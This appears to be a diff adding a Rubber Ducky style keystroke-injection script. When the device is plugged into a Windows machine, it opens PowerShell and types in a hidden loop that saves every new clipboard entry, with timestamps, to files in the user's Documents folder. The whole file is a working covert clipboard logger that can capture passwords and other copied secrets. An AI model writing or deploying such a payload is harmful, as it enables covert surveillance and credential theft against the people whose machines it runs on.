@@ -1,0 +1,16 @@
+REM AUTHOR KIERAN HUMAN
+
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+STRING $baseDir="$env:USERPROFILE\Documents\Scripts\Clipboard History";if(-not(Test-Path $baseDir)){New-Item -ItemType Directory -Path $baseDir -Force};$lastText="";$currentMinute="";$filePath="";$hostname=$env:COMPUTERNAME;
+ENTER
+DELAY 1000
+STRING while($true){try{$now=Get-Date;$minuteStamp=$now.ToString("yyyy-MM-dd_HH-mm");if($minuteStamp -ne $currentMinute){$fileTimestamp=$now.ToString("yyyy-MM-dd_HH-mm-ss");$fileName="${fileTimestamp}_Clipboard.txt";$filePath=Join-Path $baseDir $fileName;$currentMinute=$minuteStamp};
+ENTER
+DELAY 1000
+STRING $currentText=Get-Clipboard -Raw;if($currentText -and $currentText -ne $lastText){$timestamp=$now.ToString("yyyy-MM-dd HH:mm:ss");Add-Content -Path $filePath -Value "`n[$timestamp]`n$currentText`n";$lastText=$currentText}}catch{};Start-Sleep -Seconds 1}
+ENTER
